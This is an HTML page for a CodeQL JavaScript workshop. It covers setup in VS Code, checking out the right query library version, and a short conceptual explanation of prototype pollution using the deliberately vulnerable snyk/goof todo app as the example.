docs/codeql/codeql-workshops/javascript/codeql-js-goof-workshop/workshop.html
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<!-- 2020-10-20 Tue 15:19 -->
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CodeQL workshop for javascript</title>
<meta name="generator" content="Org mode" />
<meta name="author" content="Michael Hohn" />
<link rel="stylesheet" type="text/css" href="./l3style.css"/>
</head>
<body>
<div id="content">
<h1 class="title">CodeQL workshop for javascript</h1>
<div id="toc">
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#org15b2b3f">1. Setup instructions for Visual Studio Code</a></li>
<li><a href="#orge40d37c">2. Download the workshop zip file</a></li>
<li><a href="#orgf632d5a">3. Setting up your environment</a></li>
<li><a href="#org1fdee83">4. CodeQL workshop for javascript, Part 1: Identify the Problem</a>
<ul>
<li><a href="#orge83f92d">4.1. The Prototype Pollution Problem</a></li>
<li><a href="#orgf450473">4.2. Exploit the snyk/goof Application</a></li>
<li><a href="#orgdc5bf28">4.3. Find problems in source code</a></li>
</ul>
</li>
<li><a href="#orgeed0f82">5. CodeQL workshop for javascript, Part 2: Write query</a>
<ul>
<li><a href="#orga4429a0">5.1. Import the CodeQL database</a></li>
<li><a href="#org8824770">5.2. Custom query for local flow</a></li>
<li><a href="#org7c3269e">5.3. Custom Global TaintTracking Query and Path Query</a></li>
<li><a href="#org111059a">5.4. CodeQL JS library documentation</a></li>
<li><a href="#org3f71a9f">5.5. CodeQL JS data flow library documentation</a></li>
</ul>
</li>
<li><a href="#org28af9d8">6. Appendices</a>
<ul>
<li><a href="#org93e9eec">6.1. Appendix A: Trace the exploit in the VS Code JS Debugger</a></li>
<li><a href="#orgc3c7b89">6.2. Appendix B: Run default queries</a></li>
<li><a href="#org1b0a38d">6.3. Appendix C: Expand existing query with new sources and sinks</a></li>
<li><a href="#org7d429ea">6.4. Appendix D: Further Reading</a></li>
<li><a href="#org4721eb6">6.5. Appendix E: Complete Setup and Exploit of the snyk/goof Application</a></li>
</ul>
</li>
</ul>
</div>
</div>
</div>

<div id="org-content">

<div id="outline-container-org15b2b3f" class="outline-2">
<h2 id="org15b2b3f"><span class="section-number-2">1</span> Setup instructions for Visual Studio Code</h2>
<div class="outline-text-2" id="text-1">
<p>
To run CodeQL queries offline, follow these steps:
</p>

<ol class="org-ol">
<li>Install the Visual Studio Code IDE.</li>
<li>Download and install the <a href="https://help.semmle.com/codeql/codeql-for-vscode.html">CodeQL extension for Visual Studio Code</a>. Full setup
instructions are <a href="https://help.semmle.com/codeql/codeql-for-vscode/procedures/setting-up.html">here</a>.</li>
<li><a href="https://help.semmle.com/codeql/codeql-for-vscode/procedures/setting-up.html#using-the-starter-workspace">Set up the starter workspace</a>.
<ul class="org-ul">
<li><b>Important</b>: Don't forget to <code>git clone --recursive</code> or <code>git submodule
       update --init --remote</code>, so that you obtain the standard query libraries.</li>
</ul></li>
<li>Open the starter workspace: File &gt; Open Workspace &gt; Browse to
<code>vscode-codeql-starter/vscode-codeql-starter.code-workspace</code>.</li>
</ol>
</div>
</div>

<div id="outline-container-orge40d37c" class="outline-2">
<h2 id="orge40d37c"><span class="section-number-2">2</span> Download the workshop zip file</h2>
<div class="outline-text-2" id="text-2">
<p>
The <a href="https://drive.google.com/file/d/1eTHIFXO4AThVmI1eHdS2oi6caeDEkilD/view?usp=sharing">codeql-js-goof-workshop.zip</a> file contains these instructions, the codeql
database, and a directory with the codeql samples we will develop during the
workshop.  You can use the codeql samples directory as-is by adding it to your
workspace.
</p>
</div>
</div>

<div id="outline-container-orgf632d5a" class="outline-2">
<h2 id="orgf632d5a"><span class="section-number-2">3</span> Setting up your environment</h2>
<div class="outline-text-2" id="text-3">
<p>
In case of ql library version errors when trying to run a query, try to set your
environment to match the one for this workshop by setting the ql library version
to v1.25.0:
</p>

<ul class="org-ul">
<li><p>
For a standalone ql tree, something like this
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">cd</span> ~/local/vmsync/ql
git checkout -b mh-v1.25.0 v1.25.0
</pre>
</div></li>

<li><p>
For ql in the starter workspace:
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">cd</span> ~/local/vscode-codeql-starter
git pull
git submodule update            <span style="color: #b22222;"># </span><span style="color: #b22222;">avoid database scheme mismatch</span>
git checkout -b mh-v1.25.0 origin/1.25.0
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-org1fdee83" class="outline-2">
<h2 id="org1fdee83"><span class="section-number-2">4</span> CodeQL workshop for javascript, Part 1: Identify the Problem</h2>
<div class="outline-text-2" id="text-4">
<p>
Before any queries can be written, we 
</p>
<ol class="org-ol">
<li>should be certain that the application has a vulnerability and</li>
<li>we have to identify the parts of the application's source code affected by
it.</li>
</ol>
</div>


<div id="outline-container-orge83f92d" class="outline-3">
<h3 id="orge83f92d"><span class="section-number-3">4.1</span> The Prototype Pollution Problem</h3>
<div class="outline-text-3" id="text-4-1">
<p>
In this workshop, we focus on Javascript Prototype Pollution.
</p>

<p>
Prototype pollution is a type of vulnerability in which an attacker is able to
modify <code>Object.prototype</code>.  This can happen when recursively merging a
user-controlled object into another object, allowing an attacker to
modify the built-in Object prototype.  Once that is done, later requests can
abuse the new property, e.g. to gain access to parts of a system.
</p>

<p>
This is best illustrated via example; the all-in-one vulnerable app, <a href="https://github.com/snyk/goof">goof</a>,
provides a good sample for prototype injection in a web app.  It labels itself
as the <i>Super vulnerable todo list application</i>, and has samples for seeing
those vulnerabilities in action.
</p>
</div>
</div>
